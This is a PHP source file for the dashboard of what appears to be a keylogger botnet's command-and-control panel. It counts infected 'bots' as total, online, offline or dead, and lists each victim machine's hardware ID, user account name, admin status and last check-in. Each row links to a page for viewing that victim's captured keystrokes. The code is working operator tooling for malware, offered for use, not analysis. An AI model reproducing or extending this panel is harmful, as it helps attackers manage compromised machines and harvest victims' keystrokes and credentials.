<?php
include_once("config.php");
$current_page = 1;
if(!empty($_GET['page'])){
	$current_page = $_GET['page'];
}
function GetTotalBots(){
	$bots = 0;
	$total_bots_query = "SELECT * FROM `bots`";
	$db = connection();
	if($sth = $db->prepare($total_bots_query)){
		$sth->execute();
		$bots = $sth->rowCount();
	}
	return $bots;
}
function GetOfflineBots(){
	$bots = 0;
	$total_bots_query = "SELECT * FROM `bots` WHERE `last_seen` < date_sub(NOW(), interval 10 MINUTE)";
	$db = connection();
	if($sth = $db->prepare($total_bots_query)){
		$sth->execute();
		$bots = $sth->rowCount();
	}
	return $bots;
}
function GetOnlineBots(){
	$bots = 0;
	$total_bots_query = "SELECT * FROM `bots` WHERE `last_seen` >= date_sub(NOW(), interval 10 MINUTE)";
	$db = connection();
	if($sth = $db->prepare($total_bots_query)){
		$sth->execute();
		$bots = $sth->rowCount();
		
	}
	return $bots;
}
function GetDeadBots(){
	$bots = 0;
	$total_bots_query = "SELECT * FROM `bots` WHERE `last_seen` < date_sub(NOW(), interval 7 day)";
	$db = connection();
	if($sth = $db->prepare($total_bots_query)){
		$sth->execute();
		$bots = $sth->rowCount();
	}
	return $bots;
}
function GetBotsForTable($page){
	
	if(($page -1) < 0){
		return;
	}
	$offset = ($page -1) * 10;
	
	$bot_table = "SELECT * FROM `bots` ORDER BY `last_seen` DESC LIMIT 10 OFFSET :bot_offset";
	$db = connection();
	if($sth = $db->prepare($bot_table)){
		$sth->bindParam(":bot_offset", $offset, PDO::PARAM_INT );
		$sth->execute();
		while($row = $sth->fetch(PDO::FETCH_ASSOC)){
			echo "<tr><td>".$row["HWID"]."</td><td>".$row["User_Account"]."</td><td>".$row["last_seen"]."</td><td>".$row["admin_status"]."</td><td><a  href=\"keylogger.php?bot_id=".$row["HWID"]."\" type=\"submit\" class=\"add btn btn-primary\">View</a></td></tr>";
			
		}
	}
}
$total_bots = GetTotalBots();
?>

<!DOCTYPE html>
<html lang="en">
<?php
include_once("header.php");
?>
<body class="sidebar-dark">
  <div class="container-scroller">
    <!-- partial:partials/_navbar.html -->
    <nav class="navbar col-lg-12 col-12 p-0 fixed-top d-flex flex-row">
      <div class="text-center navbar-brand-wrapper d-flex align-items-center justify-content-center">
      </div>
      <div class="navbar-menu-wrapper d-flex align-items-center justify-content-end">
   
        <ul class="navbar-nav navbar-nav-right">
        
          <li class="nav-item nav-profile dropdown">
            <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" id="profileDropdown">
              Options
            </a>
            <div class="dropdown-menu dropdown-menu-right navbar-dropdown" aria-labelledby="profileDropdown">
             
              <a class="dropdown-item">
                <i class="ti-power-off text-primary"></i>
                Logout
              </a>
            </div>
          </li>
        
        </ul>
        <button class="navbar-toggler navbar-toggler-right d-lg-none align-self-center" type="button" data-toggle="offcanvas">
          <span class="ti-layout-grid2"></span>
        </button>
      </div>
    </nav>
    <!-- partial -->
    <div class="container-fluid page-body-wrapper">
      <!-- partial:partials/_settings-panel.html -->
   
      <!-- partial -->
      <!-- partial:partials/_sidebar.html -->
   <?php
   
   include_once("sidebar.php");
   
   ?>
      <!-- partial -->
      <div class="main-panel">
        <div class="content-wrapper">
      
          <div class="row">
            <div class="col-md-3 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">
                  <p class="card-title text-md-center text-xl-left">Total Bots</p>
                  <div class="d-flex flex-wrap justify-content-between justify-content-md-center justify-content-xl-between align-items-center">
                    <h3 class="mb-0 mb-md-2 mb-xl-0 order-md-1 order-xl-0"><?php echo $total_bots; ?></h3>
                    <i class="ti-calendar icon-md text-muted mb-0 mb-md-3 mb-xl-0"></i>
                  </div>  
                </div>
              </div>
            </div>
            <div class="col-md-3 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">
                  <p class="card-title text-md-center text-xl-left">Online Bots</p>
                  <div class="d-flex flex-wrap justify-content-between justify-content-md-center justify-content-xl-between align-items-center">
                    <h3 class="mb-0 mb-md-2 mb-xl-0 order-md-1 order-xl-0"><?php echo GetOnlineBots(); ?></h3>
                    <i class="ti-user icon-md text-muted mb-0 mb-md-3 mb-xl-0"></i>
                  </div>  
                </div>
              </div>
            </div>
            <div class="col-md-3 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">
                  <p class="card-title text-md-center text-xl-left">Offline Bots</p>
                  <div class="d-flex flex-wrap justify-content-between justify-content-md-center justify-content-xl-between align-items-center">
                    <h3 class="mb-0 mb-md-2 mb-xl-0 order-md-1 order-xl-0"><?php echo GetOfflineBots(); ?></h3>
                    <i class="ti-agenda icon-md text-muted mb-0 mb-md-3 mb-xl-0"></i>
                  </div>  
                </div>
              </div>
            </div>
            <div class="col-md-3 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">
                  <p class="card-title text-md-center text-xl-left">Dead Bots</p>
                  <div class="d-flex flex-wrap justify-content-between justify-content-md-center justify-content-xl-between align-items-center">
                    <h3 class="mb-0 mb-md-2 mb-xl-0 order-md-1 order-xl-0"><?php echo GetDeadBots(); ?></h3>
                    <i class="ti-layers-alt icon-md text-muted mb-0 mb-md-3 mb-xl-0"></i>
                  </div>  
                </div>
              </div>
            </div>
          </div>
		  <div class="row">
		  
            <div class="col-lg-12 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">
                  <h4 class="card-title">Bot Info</h4>
				
                  <div class="table-responsive pt-3">
				  
                    <table class="table table-bordered">
                      <thead>
                        <tr>
                          <th>
                            Bot ID
                          </th>
                          <th>
                            User Account Name
                          </th>
                          <th>
                            Last Seen
                          </th>
                          <th>
                            Is Admin?
                          </th>
						  
                          <th>
                            View Keylogs
                          </th>
                        </tr>
                      </thead>
                      <tbody>
                       <?php
					   
					   GetBotsForTable($current_page);
					   
					   ?>
                      </tbody>
                    </table>
                  </div>
				   <p class="card-description">View Page</p>
                  <select name="page" onChange="window.location.href=this.value;">
				  <?php
				  $page_numbers = $total_bots / 10;
				  
				  for($cur_page = 1; $cur_page < $page_numbers; $cur_page++){
					  if($cur_page == $current_page){
					  echo "<option value=\"index.php?page=".$cur_page."\" selected=\"selected\">".$cur_page."</option>";
					  }
					  else{
					  echo "<option value=\"index.php?page=".$cur_page."\">".$cur_page."</option>";
					  }
					  
				  }
				  ?>
                  </select>
                </div>
              </div>
            </div>
		  
		  </div>
        
        </div>
        <!-- content-wrapper ends -->
        <!-- partial:partials/_footer.html -->
   
        <!-- partial -->
      </div>
      <!-- main-panel ends -->
    </div>
    <!-- page-body-wrapper ends -->
  </div>
  <!-- container-scroller -->

  <!-- plugins:js -->
  <script src="vendors/js/vendor.bundle.base.js"></script>
  <!-- endinject -->
  <!-- Plugin js for this page -->
  <script src="vendors/chart.js/Chart.min.js"></script>
  <!-- End plugin js for this page -->
  <!-- inject:js -->
  <script src="js/off-canvas.js"></script>
  <script src="js/hoverable-collapse.js"></script>
  <script src="js/template.js"></script>
  <script src="js/settings.js"></script>
  <script src="js/todolist.js"></script>
  <!-- endinject -->
  <!-- Custom js for this page-->
  <script src="js/dashboard.js"></script>
  <!-- End custom js for this page-->
</body>

</html>

